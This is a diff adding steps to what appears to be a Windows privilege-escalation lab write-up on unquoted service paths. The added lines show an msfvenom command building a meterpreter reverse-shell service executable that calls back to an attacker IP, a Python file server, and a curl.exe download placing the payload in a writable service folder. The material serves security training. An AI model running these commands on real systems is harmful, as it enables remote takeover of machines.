@@ -368,6 +368,11 @@ Note: I don't use a trailing backslash after "Program Files" or "Vulnerable Serv
 
 I find that the "Vulnerable Service folder is the one that my user has Full Control over
 
+On Kali I create the payload ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.199.129 LPORT=1346 -f exe-service > Vulnerable.exe``` and start my file server again ```python3 -m http.server 8000```
+
+Then on Windows ```curl.exe http://192.168.199.129:8000/Vulnerable.exe -o "C:\Program Files\Vulnerable Service\Vulnerable.exe"```
+
+
 
 DLL Hijacking - DLLHijackSvc
 
